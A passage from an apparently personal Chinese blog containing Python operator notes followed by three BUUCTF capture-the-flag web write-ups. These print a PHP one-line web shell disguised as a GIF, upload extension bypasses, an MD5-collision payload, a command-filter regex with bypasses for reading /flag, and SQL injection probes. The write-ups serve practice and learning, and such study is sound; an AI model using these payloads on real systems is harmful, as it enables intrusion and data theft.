<h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">以下假设变量a为<span class="number">10</span>，变量b为<span class="number">21</span>:</span><br><span class="line"></span><br><span class="line">+	加 - 两个对象相加	a + b 输出结果 <span class="number">31</span></span><br><span class="line">-	减 - 得到负数或是一个数减去另一个数	a - b 输出结果 <span class="number">-11</span></span><br><span class="line">*	乘 - 两个数相乘或是返回一个被重复若干次的字符串	a * b 输出结果 <span class="number">210</span></span><br><span class="line">/	除 - x 除以 y	b / a 输出结果 <span class="number">2.1</span></span><br><span class="line">%	取模 - 返回除法的余数	b % a 输出结果 <span class="number">1</span></span><br><span class="line">**	幂 - 返回x的y次幂	a**b 为<span class="number">10</span>的<span class="number">21</span>次方</span><br><span class="line"><span class="comment">//	取整除 - 向下取接近除数的整数 9//2=4</span></span><br></pre></td></tr></table></figure>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">以下假设变量a为<span class="number">10</span>，变量b为<span class="number">20</span>：</span><br><span class="line"></span><br><span class="line">==	等于 - 比较对象是否相等	<span class="comment">(a == b)</span> 返回 False。</span><br><span class="line">!=	不等于 - 比较两个对象是否不相等	<span class="comment">(a != b)</span> 返回 True。</span><br><span class="line">&gt;	大于 - 返回x是否大于y	<span class="comment">(a &gt; b)</span> 返回 False。</span><br><span class="line">&lt;	小于 - 返回x是否小于y。所有比较运算符返回<span class="number">1</span>表示真，返回<span class="number">0</span>表示假.	<span class="comment">(a &lt; b)</span> 返回 True。</span><br><span class="line">&gt;=	大于等于 - 返回x是否大于等于y。	<span class="comment">(a &gt;= b)</span> 返回 False。</span><br><span class="line">&lt;=	小于等于 - 返回x是否小于等于y。	<span class="comment">(a &lt;= b)</span> 返回 True。</span><br></pre></td></tr></table></figure>

<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">以下假设变量a为<span class="number">10</span>，变量b为<span class="number">20</span>：</span><br><span class="line"></span><br><span class="line">=	简单的赋值运算符	<span class="keyword">c</span> = a + b 将 a + b 的运算结果赋值为 <span class="keyword">c</span></span><br><span class="line">+=	加法赋值运算符	<span class="keyword">c</span> += a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> + a</span><br><span class="line">-=	减法赋值运算符	<span class="keyword">c</span> -= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> - a</span><br><span class="line">*=	乘法赋值运算符	<span class="keyword">c</span> *= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> * a</span><br><span class="line">/=	除法赋值运算符	<span class="keyword">c</span> /= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> / a</span><br><span class="line">%=	取模赋值运算符	<span class="keyword">c</span> %= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> % a</span><br><span class="line">**=	幂赋值运算符	<span class="keyword">c</span> **= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> ** a</span><br><span class="line">//=	取整除赋值运算符	<span class="keyword">c</span> //= a 等效于 <span class="keyword">c</span> = <span class="keyword">c</span> // a</span><br></pre></td></tr></table></figure>

<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">&amp;	 按位与运算符：参与运算的两个值,如果两个相应位都为<span class="number">1</span>,则该位的结果为<span class="number">1</span>,否则为<span class="number">0</span>（a &amp; b) 输出结果 <span class="number">12</span></span><br><span class="line">|	 按位或运算符：只要对应的二个二进位有一个为<span class="number">1</span>时，结果位就为<span class="number">1</span>。(a | b) 输出结果 <span class="number">61</span></span><br><span class="line">^	 按位异或运算符：当两对应的二进位相异时，结果为<span class="number">1</span>(a ^ b) 输出结果 <span class="number">49</span></span><br><span class="line">~	 按位取反运算符：对数据的每个二进制位取反,即把<span class="number">1</span>变为<span class="number">0</span>,把<span class="number">0</span>变为<span class="number">1</span>。在一个有符号二进制数的补码形式。</span><br><span class="line">&lt;&lt;	 左移动运算符：运算数的各二进位全部左移若干位，由<span class="string">"&lt;&lt;"</span>右边的数指定移动的位数，高位丢弃，低位补<span class="number">0</span>。a &lt;&lt; <span class="number">2</span> 输出结果 <span class="number">240</span></span><br><span class="line">&gt;&gt;	 右移动运算符：把<span class="string">"&gt;&gt;"</span>左边的运算数的各二进位全部右移若干位，<span class="string">"&gt;&gt;"</span>右边的数指定移动的位数	a &gt;&gt; <span class="number">2</span> 输出结果 <span class="number">15</span></span><br></pre></td></tr></table></figure>

<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">假设变量</span> <span class="string">a</span> <span class="string">为</span> <span class="number">10</span><span class="string">,</span> <span class="string">b为</span> <span class="attr">20:</span></span><br><span class="line"><span class="string">and</span>	<span class="string">x</span> <span class="string">and</span> <span class="string">y</span>	<span class="string">布尔"与"</span> <span class="bullet">-</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">为</span> <span class="literal">False</span><span class="string">，x</span> <span class="string">and</span> <span class="string">y</span> <span class="string">返回</span> <span class="literal">False</span><span class="string">，否则它返回</span> <span class="string">y</span> <span class="string">的计算值。(a</span> <span class="string">and</span> <span class="string">b)</span> <span class="string">返回</span> <span class="number">20</span><span class="string">。</span></span><br><span class="line"><span class="string">or</span>	<span class="string">x</span> <span class="string">or</span> <span class="string">y</span>	<span class="string">布尔"或"</span> <span class="bullet">-</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">是</span> <span class="literal">True</span><span class="string">，它返回</span> <span class="string">x</span> <span class="string">的值，否则它返回</span> <span class="string">y</span> <span class="string">的计算值。(a</span> <span class="string">or</span> <span class="string">b)</span> <span class="string">返回</span> <span class="number">10</span><span class="string">。</span></span><br><span class="line"><span class="string">not</span>	<span class="string">not</span> <span class="string">x</span>	<span class="string">布尔"非"</span> <span class="bullet">-</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">为</span> <span class="literal">True</span><span class="string">，返回</span> <span class="literal">False</span> <span class="string">。如果</span> <span class="string">x</span> <span class="string">为</span> <span class="literal">False</span><span class="string">，它返回</span> <span class="literal">True</span><span class="string">。</span>	</span><br><span class="line">				<span class="string">not(a</span> <span class="string">and</span> <span class="string">b)</span> <span class="string">返回</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">a = 0</span><br><span class="line">b = 20</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a <span class="keyword">and</span> b ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - 变量 a 和 b 都为 true"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - 变量 a 和 b 有一个不为 true"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a <span class="keyword">or</span> b ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - 变量 a 和 b 都为 true，或其中一个变量为 true"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - 变量 a 和 b 都不为 true"</span>)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line">1 - 变量 a 和 b 有一个不为 <span class="literal">true</span></span><br><span class="line">2 - 变量 a 和 b 都为 <span class="literal">true</span>，或其中一个变量为 <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">in</span>	<span class="string">如果在指定的序列中找到值返回</span> <span class="literal">True</span><span class="string">，否则返回</span> <span class="literal">False</span><span class="string">。</span>	<span class="string">x</span> <span class="string">在</span> <span class="string">y</span> <span class="string">序列中</span> <span class="string">,</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">在</span> <span class="string">y</span> <span class="string">序列中返回</span> <span class="literal">True</span><span class="string">。</span></span><br><span class="line"></span><br><span class="line"><span class="string">not</span> <span class="string">in</span>	<span class="string">如果在指定的序列中没有找到值返回</span> <span class="literal">True</span><span class="string">，否则返回</span> <span class="literal">False</span><span class="string">。</span>	<span class="string">x</span> <span class="string">不在</span> <span class="string">y</span> <span class="string">序列中</span> <span class="string">,</span> <span class="string">如果</span> <span class="string">x</span> <span class="string">不在</span> <span class="string">y</span> <span class="string">序列中返回</span> <span class="literal">True</span><span class="string">。</span></span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">20</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a in <span class="built_in">list</span> ):</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"1 - 变量 a 在给定的列表中 list 中"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"1 - 变量 a 不在给定的列表中 list 中"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( b <span class="keyword">not</span> in <span class="built_in">list</span> ):</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"2 - 变量 b 不在给定的列表中 list 中"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"2 - 变量 b 在给定的列表中 list 中"</span>)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line"><span class="number">1</span> - 变量 a 在给定的列表中 <span class="built_in">list</span> 中</span><br><span class="line"><span class="number">2</span> - 变量 b 不在给定的列表中 <span class="built_in">list</span> 中</span><br></pre></td></tr></table></figure>

<h3 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h3><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="literal">is</span>	<span class="literal">is</span> 是判断两个标识符是不是引用自一个对象	x <span class="literal">is</span> y, 类似<span class="built_in"> id</span>(x) ==<span class="built_in"> id</span>(y) , 如果引用的是同一个对象则返回 True，否则返回 False</span><br><span class="line"></span><br><span class="line"><span class="literal">is</span><span class="built_in"> not</span>	<span class="literal">is</span><span class="built_in"> not</span> 是判断两个标识符是不是引用自不同对象	x <span class="literal">is</span><span class="built_in"> not</span> y ， 类似<span class="built_in"> id</span>(a) !=<span class="built_in"> id</span>(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">a = 20</span><br><span class="line">b = 30</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a is b ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - a 和 b 有相同的标识"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"1 - a 和 b 没有相同的标识"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( id(a) == id(b) ):</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - a 和 b 有相同的标识"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="builtin-name">print</span> (<span class="string">"2 - a 和 b 没有相同的标识"</span>)</span><br><span class="line">   </span><br><span class="line">结果为：</span><br><span class="line">1 - a 和 b 没有相同的标识</span><br><span class="line">2 - a 和 b 没有相同的标识</span><br></pre></td></tr></table></figure>

<h3 id="常用数学函数"><a href="#常用数学函数" class="headerlink" title="常用数学函数"></a>常用数学函数</h3><figure class="highlight gml"><table><tr><td class="code"><pre><span class="line"><span class="built_in">abs</span>(<span class="symbol">x</span>)  返回数字的绝对值 如<span class="built_in">abs</span>(<span class="number">-10</span>) 返回 <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ceil</span>(<span class="symbol">x</span>)  向上取整 如math.<span class="built_in">ceil</span>(<span class="number">4.1</span>) 返回 <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">floor</span>(<span class="symbol">x</span>)  向下取整 如math.<span class="built_in">floor</span>(<span class="number">4.9</span>)返回 <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span>(<span class="symbol">x</span>)  返回e的<span class="symbol">x</span>次幂(ex) 如math.<span class="built_in">exp</span>(<span class="number">1</span>) 返回<span class="number">2.718281828459045</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sqrt</span>(<span class="symbol">x</span>)  求平方根</span><br><span class="line"></span><br><span class="line">acos(<span class="symbol">x</span>)  返回<span class="symbol">x</span>的反余弦弧度值</span><br><span class="line"></span><br><span class="line"><span class="built_in">cos</span>(<span class="symbol">x</span>)  返回<span class="symbol">x</span>的弧度的余弦值</span><br><span class="line"></span><br><span class="line"><span class="built_in">sin</span>,<span class="built_in">tan</span>类似</span><br></pre></td></tr></table></figure>

<h3 id="常用随机数函数"><a href="#常用随机数函数" class="headerlink" title="常用随机数函数"></a>常用随机数函数</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">choice(seq)  从序列元素中随机挑选一个元素 比如random.choice(range(<span class="number">10</span>))，从<span class="number">0</span>到<span class="number">9</span>中随机挑选一个整数</span><br><span class="line"></span><br><span class="line">random() 随机生成一个实数，在范围[<span class="number">0</span>,<span class="number">1</span>)内</span><br><span class="line"></span><br><span class="line">randrange ([start,] stop [,step])  从指定范围内 按指定基数递增的集合中获取一个随机数 基数默认值为 <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="数学常量"><a href="#数学常量" class="headerlink" title="数学常量"></a>数学常量</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="literal">pi</span> 数学常量<span class="literal">pi</span> 圆周率</span><br><span class="line">e  数学常量e 自然常数</span><br></pre></td></tr></table></figure>

<h2 id="周报总结："><a href="#周报总结：" class="headerlink" title="周报总结："></a>周报总结：</h2><p> <strong>1.python语言较为简单，但是也面临着一个新的问题，由于python不需要用<code>;</code>来代表语句结束，<code>{}</code>代表代码块，而是使用TAB和空格来进行区分，所以要严格控制TAB和空格的数量，以便区分每个语句或代码块</strong></p>
<p> <strong>2.<code>if while</code>这些复合语句，不像C或者JAVA一样有{}，需要在if [条件] 之后加<code>:</code>表示代码块的开始</strong></p>
<p> <strong>3.<code>import</code>是导入整个模块，<code>from...import</code>是导入某个模块中的某个函数，第二种更为灵活，可以减少时间复杂度，提高效率和辨识度</strong></p>
<p> <strong>4.输入和输出都较为简单，<code>input</code>和<code>print</code>与python2的区别就是需要加括号而不是空格</strong></p>
<p> <strong>5.字符串可以实现多行代码但是需要用三引号括住</strong></p>
<p> <strong>6.字符串不可更改</strong></p>
<p> <strong>7.python对大小写敏感</strong></p>
<p> <strong>8.反斜杠在python中需要慎用，有可能会造成转义而形成不必要的麻烦</strong></p>
<p> <strong>9.python引入了成员运算符<code>（in 和 not in）</code> 可以更加方便地对数据进行查找</strong></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Upload</title>
    <url>/2020/02/17/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="极客大挑战 2019 Upload"></a>极客大挑战 2019 Upload</h1><p>打开题目是个上传，随便上传一个图片 竟然告诉我NOT image<br>所以考虑一下文件类型绕过</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">常用一句话：</span><br><span class="line">GIF89a? </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_REQUEST[shell])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP绕过后缀名检测：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">php,php3,php4,php5,phtml.pht</span><br></pre></td></tr></table></figure>

<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Upload/0.png" alt="avatar"></p>
<p>上传成功，用蚁剑连接<br>在根目录下得到flag</p>
<p>注意，文件都存在upload目录下</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-安洵杯 2019 easy_web</title>
    <url>/2020/02/17/BUUCTF-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
    <content><![CDATA[<p>打开之后 看到题目 确实很真实 WEB狗可咋活啊</p>
<p>查看源码也啥都没有，最后可疑的就是URL中img后面的字符串，尝试一下base64<br>最后经过两次base64一个hex得到555.png</p>
<p>尝试一下访问index.php 用它的方法得到：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">TmprMlJUWTBOalUzT<span class="number">0</span>RKRk<span class="number">56</span>QTJPRG<span class="symbol">N3</span></span><br></pre></td></tr></table></figure>
<p>查看源码，解密一下得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>看这一段：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="built_in">string</span>)$_POST[<span class="string">'a'</span>] !== (<span class="built_in">string</span>)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        echo `$cmd`<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>可以考虑用md5碰撞</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure>

<p>这一段是过滤 过滤的太挺多的：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="symbol">\'</span>|<span class="symbol">\"</span>|<span class="symbol">\`</span>|;|,|<span class="symbol">\*</span>|<span class="symbol">\?</span>|<span class="symbol">\\</span>|<span class="symbol">\\</span><span class="symbol">\\</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\r</span>|<span class="symbol">\x</span>A0|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|<span class="symbol">\\</span>$|<span class="symbol">\[</span>|<span class="symbol">\]</span>|&#123;|&#125;|<span class="symbol">\(</span>|<span class="symbol">\)</span>|-|&lt;|&gt;/i", <span class="keyword">$cmd))</span></span><br></pre></td></tr></table></figure>

<p>cmd没有过滤sort，所以可以使用sort%20/flag<br>在看了WP之后，得到知识点：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">以下正则可以过滤\</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cmd=<span class="string">"\\"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cmd;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/|\\\\|\?/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"1"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/\\\\/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"2"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/|\\|/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"3"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/|\|/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"4"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// \1234</span></span></span><br><span class="line"><span class="php">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span></span><br></pre></td></tr></table></figure>

<p>所以还可以使用ca\t%20/flag</p>
<p>三个表达式结合一下，payload:<br><img src="/images/BUUCTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019easyweb/0.png" alt="avatar"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-SWPU2019 Web1</title>
    <url>/2020/02/17/BUUCTF-SWPU2019-Web1/</url>
    <content><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019 Web1"></a>SWPU2019 Web1</h1><p>打开是个登录界面，先注册登录进去</p>
<p>发现可以申请广告位，在广告位</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">'</span><br></pre></td></tr></table></figure>
<p>得到回显，证明有SQL注入</p>
<p>试一下</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>发现空格被过滤了 用/**/代替一下</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>最后用二分法试出有22个字段</p>
